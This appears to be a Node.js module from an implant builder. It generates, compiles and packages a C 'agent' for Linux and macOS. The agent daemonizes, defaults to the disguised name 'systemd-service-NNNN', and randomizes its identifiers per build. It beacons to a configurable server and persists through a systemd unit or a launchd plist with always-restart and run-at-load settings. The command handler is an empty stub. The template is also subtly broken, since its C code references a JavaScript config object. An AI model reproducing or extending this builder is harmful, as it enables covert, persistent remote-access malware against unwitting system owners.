const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);

/**
 * Detect target platform from config
 */
function detectPlatform(config) {
    // Default to windows if not specified
    if (!config.platform) {
        return 'windows';
    }

    const platform = config.platform.toLowerCase();
    if (['windows', 'win', 'win32'].includes(platform)) {
        return 'windows';
    } else if (['linux', 'unix'].includes(platform)) {
        return 'linux';
    } else if (['macos', 'mac', 'darwin', 'osx'].includes(platform)) {
        return 'macos';
    }

    return 'windows'; // Default fallback
}

/**
 * Generate platform-specific code
 */
function generatePlatformCode(platform, config, randomId) {
    switch (platform) {
        case 'linux':
            return generateLinuxCode(config, randomId);
        case 'macos':
            return generateMacOSCode(config, randomId);
        case 'windows':
        default:
            return null; // Windows code is handled by existing service
    }
}

/**
 * Generate Linux-specific code
 */
function generateLinuxCode(config, randomId) {
    const serviceName = config.serviceName || `systemd-service-${Math.floor(Math.random() * 10000)}`;
    
    return `
// Linux Agent - ${randomId}
// Generated: ${new Date().toISOString()}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>

// Global variables
pid_t g_pid${randomId.substring(0, 8)} = 0;
int g_socket${randomId.substring(8, 16)} = -1;
int g_running${randomId.substring(0, 4)} = 1;

// Function prototypes
int InitializeAgent${randomId.substring(0, 8)}(void);
int ConnectToServer${randomId.substring(8, 16)}(void);
void SendHeartbeat${randomId.substring(0, 8)}(void);
void ProcessCommands${randomId.substring(8, 16)}(void);
void SignalHandler${randomId.substring(0, 8)}(int sig);

// Main entry point
int main(int argc, char *argv[]) {
    // Daemonize if needed
    if (config.enableServiceInstallation) {
        if (daemon(0, 0) < 0) {
            perror("daemon");
            return 1;
        }
    }

    g_pid${randomId.substring(0, 8)} = getpid();
    
    // Set up signal handlers
    signal(SIGTERM, SignalHandler${randomId.substring(0, 8)});
    signal(SIGINT, SignalHandler${randomId.substring(0, 8)});

    if (!InitializeAgent${randomId.substring(0, 8)}()) {
        return 1;
    }

    // Main loop
    while (g_running${randomId.substring(0, 4)}) {
        if (ConnectToServer${randomId.substring(8, 16)}()) {
            SendHeartbeat${randomId.substring(0, 8)}();
            ProcessCommands${randomId.substring(8, 16)}();
        }
        sleep(${config.heartbeatInterval || 30});
    }

    return 0;
}

// Initialize agent
int InitializeAgent${randomId.substring(0, 8)}(void) {
    // Create PID file
    char pidfile[256];
    snprintf(pidfile, sizeof(pidfile), "/var/run/%s.pid", "${serviceName}");
    FILE *fp = fopen(pidfile, "w");
    if (fp) {
        fprintf(fp, "%d\\n", g_pid${randomId.substring(0, 8)});
        fclose(fp);
    }

    return 1;
}

// Connect to server
int ConnectToServer${randomId.substring(8, 16)}(void) {
    struct sockaddr_in server_addr;
    
    g_socket${randomId.substring(8, 16)} = socket(AF_INET, SOCK_STREAM, 0);
    if (g_socket${randomId.substring(8, 16)} < 0) {
        return 0;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(${config.serverPort || 8080});
    inet_pton(AF_INET, "${config.serverUrl || '127.0.0.1'}", &server_addr.sin_addr);

    if (connect(g_socket${randomId.substring(8, 16)}, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(g_socket${randomId.substring(8, 16)});
        g_socket${randomId.substring(8, 16)} = -1;
        return 0;
    }

    return 1;
}

// Send heartbeat
void SendHeartbeat${randomId.substring(0, 8)}(void) {
    if (g_socket${randomId.substring(8, 16)} >= 0) {
        const char *heartbeat = "HEARTBEAT\\n";
        send(g_socket${randomId.substring(8, 16)}, heartbeat, strlen(heartbeat), 0);
    }
}

// Process commands
void ProcessCommands${randomId.substring(8, 16)}(void) {
    // Command processing logic
}

// Signal handler
void SignalHandler${randomId.substring(0, 8)}(int sig) {
    g_running${randomId.substring(0, 4)} = 0;
    if (g_socket${randomId.substring(8, 16)} >= 0) {
        close(g_socket${randomId.substring(8, 16)});
    }
}
`;
}

/**
 * Generate macOS-specific code
 */
function generateMacOSCode(config, randomId) {
    // Similar to Linux but with macOS-specific features
    return generateLinuxCode(config, randomId); // For now, use Linux code as base
}

/**
 * Compile platform-specific executable
 */
async function compilePlatformExecutable(platform, sourcePath, outputPath) {
    switch (platform) {
        case 'linux':
            // Compile with gcc
            try {
                await execPromise(`gcc -o "${outputPath}" "${sourcePath}" -lpthread -static`);
                return true;
            } catch (error) {
                console.error('Linux compilation failed:', error);
                return false;
            }
        
        case 'macos':
            // Compile with clang
            try {
                await execPromise(`clang -o "${outputPath}" "${sourcePath}" -lpthread`);
                return true;
            } catch (error) {
                console.error('macOS compilation failed:', error);
                return false;
            }
        
        default:
            return false;
    }
}

/**
 * Create platform-specific package
 */
async function createPlatformPackage(platform, buildId, executablePath) {
    const tempDir = path.join(__dirname, '../temp');
    const packagePath = path.join(tempDir, `agent_${buildId}_${platform}.tar.gz`);

    switch (platform) {
        case 'linux':
            // Create systemd service file
            const serviceFilePath = path.join(tempDir, `agent_${buildId}.service`);
            const serviceContent = `[Unit]
Description=Agent Service
After=network.target

[Service]
Type=simple
ExecStart=${executablePath}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
`;
            fs.writeFileSync(serviceFilePath, serviceContent);

            // Create tarball
            try {
                await execPromise(`tar -czf "${packagePath}" -C "${path.dirname(executablePath)}" "${path.basename(executablePath)}" -C "${tempDir}" "${path.basename(serviceFilePath)}"`);
                return packagePath;
            } catch (error) {
                console.error('Failed to create Linux package:', error);
                return null;
            }

        case 'macos':
            // Create launchd plist
            const plistPath = path.join(tempDir, `agent_${buildId}.plist`);
            const plistContent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.agent.${buildId}</string>
    <key>ProgramArguments</key>
    <array>
        <string>${executablePath}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
`;
            fs.writeFileSync(plistPath, plistContent);

            // Create tarball
            try {
                await execPromise(`tar -czf "${packagePath}" -C "${path.dirname(executablePath)}" "${path.basename(executablePath)}" -C "${tempDir}" "${path.basename(plistPath)}"`);
                return packagePath;
            } catch (error) {
                console.error('Failed to create macOS package:', error);
                return null;
            }

        default:
            return null;
    }
}

module.exports = {
    detectPlatform,
    generatePlatformCode,
    compilePlatformExecutable,
    createPlatformPackage
};

